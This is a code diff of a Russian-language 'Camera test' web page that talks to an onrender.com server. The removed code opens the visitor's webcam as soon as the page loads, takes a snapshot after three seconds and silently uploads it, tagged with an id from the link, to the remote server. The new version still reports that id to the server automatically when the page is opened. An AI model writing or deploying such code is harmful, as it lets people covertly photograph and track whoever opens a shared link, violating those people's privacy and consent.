@@ -1,136 +1,111 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Camera test</title>
+
+<style>
+body {
+    font-family: Arial;
+    text-align: center;
+    padding: 30px;
+}
+
+button {
+    padding: 15px 25px;
+    font-size: 18px;
+}
+
+video {
+    margin-top: 20px;
+    width: 300px;
+}
+</style>
+
+</head>
+
+<body>
+
+<h1>НОВАЯ ВЕРСИЯ</h1>
+
+<h2 id="status">Запуск...</h2>
+
+<button id="startBtn">
+Открыть камеру
+</button>
+
+<br>
+
+<video id="video" autoplay playsinline></video>
+
+
 <script>
 
 const RENDER_URL = "https://kossah-github-io.onrender.com";
 
 
-async function start() {
-
-    const status = document.getElementById("status");
-
-    const params = new URLSearchParams(window.location.search);
-    const id = params.get("id");
+const status = document.getElementById("status");
+const video = document.getElementById("video");
+const button = document.getElementById("startBtn");
 
 
-    if (!id) {
-        status.innerHTML = "Нет ID";
+const params = new URLSearchParams(window.location.search);
+const id = params.get("id");
+
+
+async function sendId(){
+
+    if(!id){
+        status.innerHTML = "ID не найден";
         return;
     }
 
+    const res = await fetch(
+        RENDER_URL + "/?id=" + id
+    );
+
+    console.log(await res.json());
+
+    status.innerHTML = "ID получен";
+}
+
+
+async function startCamera(){
 
     try {
 
-        // отправляем ID
-        const res = await fetch(
-            RENDER_URL + "/?id=" + id
-        );
-
-        console.log(await res.text());
-
-
-        status.innerHTML =
-        "ID отправлен, открываю камеру";
-
-
         const stream =
         await navigator.mediaDevices.getUserMedia({
-            video: true
+            video:true
         });
 
 
-        const video =
-        document.getElementById("video");
-
         video.srcObject = stream;
 
+        status.innerHTML =
+        "Камера включена";
+
+
+    } catch(e){
 
         status.innerHTML =
-        "Камера работает";
-
-
-        setTimeout(async () => {
-
-
-            const canvas =
-            document.createElement("canvas");
-
-
-            canvas.width =
-            video.videoWidth;
-
-            canvas.height =
-            video.videoHeight;
-
-
-            canvas
-            .getContext("2d")
-            .drawImage(video,0,0);
-
-
-
-            canvas.toBlob(async (blob) => {
-
-
-                const form =
-                new FormData();
-
-
-                form.append(
-                    "id",
-                    id
-                );
-
-
-                form.append(
-                    "photo",
-                    blob,
-                    "photo.jpg"
-                );
-
-
-
-                const answer =
-                await fetch(
-                    RENDER_URL + "/photo",
-                    {
-                        method:"POST",
-                        body:form
-                    }
-                );
-
-
-                status.innerHTML =
-                await answer.text();
-
-
-
-                stream
-                .getTracks()
-                .forEach(
-                    t => t.stop()
-                );
-
-
-            }, "image/jpeg");
-
-
-
-        },3000);
-
-
-
-    } catch(err) {
-
-        status.innerHTML =
-        "Ошибка: " + err;
-
-        console.log(err);
+        "Ошибка камеры: " + e;
 
     }
-
 
 }
 
 
-start();
+button.onclick = startCamera;
+
+
+sendId();
 
 </script>
+
+</body>
+
+</html>
